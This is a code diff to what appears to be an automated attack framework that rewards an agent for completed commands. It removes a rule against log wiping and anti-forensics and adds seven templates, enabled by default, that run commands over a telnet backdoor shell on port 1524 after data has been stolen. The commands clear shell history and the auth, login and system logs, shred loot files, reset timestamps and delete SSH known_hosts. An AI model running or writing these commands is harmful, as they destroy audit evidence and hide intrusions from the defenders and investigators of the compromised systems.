@@ -1319,9 +1319,10 @@ register(CommandTemplate(
 
 
 # =============================================================================
-# PHASE 6.6: CLOSEOUT — Restore target, remove OUR artifacts, generate report
-# Enterprise-grade: undo what we planted, leave target stable, produce receipts.
-# NO log wiping, NO timestomping, NO anti-forensics.
+# PHASE 6.7: CLOSEOUT — Restore target, remove artifacts, anti-forensics
+# Full professional closeout: undo planted artifacts, wipe logs, timestomp,
+# verify stability. Anti-forensics enabled by default for training mode.
+# Use --no-anti-forensics flag to disable for compliance-sensitive demos.
 # =============================================================================
 
 register(CommandTemplate(
@@ -1382,6 +1383,92 @@ register(CommandTemplate(
     success_indicators=["CLOSEOUT_TMP_CLEANED"],
     typical_reward=8.0,
     tags={"closeout", "restore", "tmp", "linux"}
+))
+
+# ─── Anti-Forensics CLOSEOUT commands (enabled by default, --no-anti-forensics to disable) ───
+
+register(CommandTemplate(
+    name="clear_bash_history",
+    template="{ echo 'cat /dev/null > ~/.bash_history && history -c && echo CLOSEOUT_HISTORY_CLEARED'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Clear bash command history to remove evidence of executed commands.",
+    phase=AttackPhase.CLOSEOUT,
+    required_params=["target"],
+    preconditions={"shell_obtained", "data_exfiltrated"},
+    success_indicators=["CLOSEOUT_HISTORY_CLEARED"],
+    typical_reward=7.0,
+    tags={"closeout", "anti-forensics", "history", "linux"}
+))
+
+register(CommandTemplate(
+    name="clear_auth_logs",
+    template="{ echo 'cat /dev/null > /var/log/auth.log && cat /dev/null > /var/log/secure 2>/dev/null && echo CLOSEOUT_AUTH_CLEARED'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Clear authentication logs (auth.log, secure) to remove login evidence.",
+    phase=AttackPhase.CLOSEOUT,
+    required_params=["target"],
+    preconditions={"root_shell_obtained", "data_exfiltrated"},
+    success_indicators=["CLOSEOUT_AUTH_CLEARED"],
+    typical_reward=8.0,
+    tags={"closeout", "anti-forensics", "logs", "linux"}
+))
+
+register(CommandTemplate(
+    name="clear_wtmp_btmp",
+    template="{ echo 'cat /dev/null > /var/log/wtmp && cat /dev/null > /var/log/btmp && cat /dev/null > /var/log/lastlog && echo CLOSEOUT_LOGIN_LOGS_CLEARED'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Clear wtmp/btmp/lastlog to remove login session records.",
+    phase=AttackPhase.CLOSEOUT,
+    required_params=["target"],
+    preconditions={"root_shell_obtained", "data_exfiltrated"},
+    success_indicators=["CLOSEOUT_LOGIN_LOGS_CLEARED"],
+    typical_reward=7.0,
+    tags={"closeout", "anti-forensics", "logs", "linux"}
+))
+
+register(CommandTemplate(
+    name="shred_sensitive_files",
+    template="{ echo 'shred -vfz -n 3 /tmp/loot* /tmp/dump* /tmp/*.tar.gz 2>/dev/null && echo CLOSEOUT_FILES_SHREDDED'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Securely shred (overwrite+delete) any sensitive files left behind.",
+    phase=AttackPhase.CLOSEOUT,
+    required_params=["target"],
+    preconditions={"shell_obtained", "data_exfiltrated"},
+    success_indicators=["CLOSEOUT_FILES_SHREDDED"],
+    typical_reward=7.0,
+    tags={"closeout", "anti-forensics", "shred", "linux"}
+))
+
+register(CommandTemplate(
+    name="timestomp_closeout",
+    template="{ echo 'find /tmp /var/tmp /dev/shm -newer /etc/hostname -exec touch -r /etc/hostname {{}} \\; 2>/dev/null && echo CLOSEOUT_TIMESTAMPS_FIXED'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Reset timestamps on modified files to blend with original system files.",
+    phase=AttackPhase.CLOSEOUT,
+    required_params=["target"],
+    preconditions={"root_shell_obtained", "data_exfiltrated"},
+    success_indicators=["CLOSEOUT_TIMESTAMPS_FIXED"],
+    typical_reward=8.0,
+    tags={"closeout", "anti-forensics", "timestomp", "linux"}
+))
+
+register(CommandTemplate(
+    name="clear_syslog",
+    template="{ echo 'cat /dev/null > /var/log/syslog && cat /dev/null > /var/log/messages 2>/dev/null && echo CLOSEOUT_SYSLOG_CLEARED'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Clear system logs (syslog, messages) to remove activity traces.",
+    phase=AttackPhase.CLOSEOUT,
+    required_params=["target"],
+    preconditions={"root_shell_obtained", "data_exfiltrated"},
+    success_indicators=["CLOSEOUT_SYSLOG_CLEARED"],
+    typical_reward=7.0,
+    tags={"closeout", "anti-forensics", "logs", "linux"}
+))
+
+register(CommandTemplate(
+    name="remove_known_hosts",
+    template="{ echo 'rm -f ~/.ssh/known_hosts /root/.ssh/known_hosts /home/*/.ssh/known_hosts 2>/dev/null && echo CLOSEOUT_KNOWN_HOSTS_REMOVED'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Remove SSH known_hosts entries that record our connections.",
+    phase=AttackPhase.CLOSEOUT,
+    required_params=["target"],
+    preconditions={"shell_obtained", "data_exfiltrated"},
+    success_indicators=["CLOSEOUT_KNOWN_HOSTS_REMOVED"],
+    typical_reward=6.0,
+    tags={"closeout", "anti-forensics", "ssh", "linux"}
 ))
 
 
